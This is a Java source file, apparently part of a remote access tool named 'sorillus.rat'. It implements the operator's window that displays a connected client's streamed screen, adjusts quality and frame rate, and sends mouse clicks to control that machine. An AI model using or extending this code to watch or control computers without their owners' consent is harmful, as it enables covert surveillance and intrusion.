package com.sorillus.rat;

import javax.swing.*;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

public class ScreenViewer {
    private JFrame frame;
    private JLabel imageLabel;
    private Server.ClientHandler clientHandler;
    private JToggleButton controlToggle;
    private volatile boolean controlEnabled = false;
    private Dimension clientScreenSize; // Размер экрана клиента

    public ScreenViewer(Server.ClientHandler clientHandler) {
        this.clientHandler = clientHandler;
        clientHandler.setScreenViewer(this);

        frame = new JFrame("Screen Viewer - " + clientHandler.getClientId() + " (" + clientHandler.getIpAddress() + ")");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(800, 600);
        frame.setLayout(new BorderLayout());

        frame.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                clientHandler.setScreenViewer(null);
            }
        });

        imageLabel = new JLabel();
        imageLabel.setHorizontalAlignment(JLabel.CENTER);
        frame.add(new JScrollPane(imageLabel), BorderLayout.CENTER);

        JPanel controlPanel = new JPanel(new FlowLayout());
        JButton qualityButton = new JButton("Set Quality");
        qualityButton.addActionListener(e -> {
            String quality = JOptionPane.showInputDialog(frame, "Enter quality (0.1 to 1.0):", "0.5");
            if (quality != null) {
                try {
                    float q = Float.parseFloat(quality);
                    if (q >= 0.1 && q <= 1.0) {
                        clientHandler.sendCommand("QUALITY:" + q);
                    } else {
                        JOptionPane.showMessageDialog(frame, "Quality must be between 0.1 and 1.0", "Error", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (NumberFormatException ex) {
                    JOptionPane.showMessageDialog(frame, "Invalid quality value", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        JButton fpsButton = new JButton("Set FPS");
        fpsButton.addActionListener(e -> {
            String fps = JOptionPane.showInputDialog(frame, "Enter FPS (1 to 30):", "5");
            if (fps != null) {
                try {
                    int f = Integer.parseInt(fps);
                    if (f >= 1 && f <= 30) {
                        clientHandler.sendCommand("FPS:" + f);
                    } else {
                        JOptionPane.showMessageDialog(frame, "FPS must be between 1 and 30", "Error", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (NumberFormatException ex) {
                    JOptionPane.showMessageDialog(frame, "Invalid FPS value", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        JButton controlButton = new JButton("Mouse & Keyboard");
        controlToggle = new JToggleButton("Control Off"); // Инициализация здесь
        controlButton.addActionListener(e -> {
            if (controlToggle.isSelected()) {
                controlToggle.setSelected(false);
                controlToggle.setText("Control Off");
                controlEnabled = false;
            } else {
                controlToggle.setSelected(true);
                controlToggle.setText("Control On");
                controlEnabled = true;
                // Запрашиваем размер экрана клиента
                clientHandler.sendCommand("GET_SCREEN_SIZE");
            }
        });

        imageLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (controlEnabled && clientScreenSize != null) {
                    // Масштабируем координаты клика относительно размера экрана клиента
                    int labelWidth = imageLabel.getWidth();
                    int labelHeight = imageLabel.getHeight();
                    int clientX = (int) ((double) e.getX() / labelWidth * clientScreenSize.width);
                    int clientY = (int) ((double) e.getY() / labelHeight * clientScreenSize.height);
                    clientHandler.sendCommand("MOUSE_CLICK:" + clientX + ":" + clientY);
                    System.out.println("Sent mouse click to client: " + clientX + ", " + clientY);
                }
            }
        });

        controlPanel.add(qualityButton);
        controlPanel.add(fpsButton);
        controlPanel.add(controlButton);
        controlPanel.add(controlToggle);
        frame.add(controlPanel, BorderLayout.SOUTH);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    public void updateScreenshot(BufferedImage screenshot) {
        if (screenshot != null) {
            Image scaledImage = screenshot.getScaledInstance(imageLabel.getWidth(), imageLabel.getHeight(), Image.SCALE_SMOOTH);
            imageLabel.setIcon(new ImageIcon(scaledImage));
        }
    }

    public void setClientScreenSize(int width, int height) {
        this.clientScreenSize = new Dimension(width, height);
        System.out.println("Received client screen size: " + width + "x" + height);
    }
}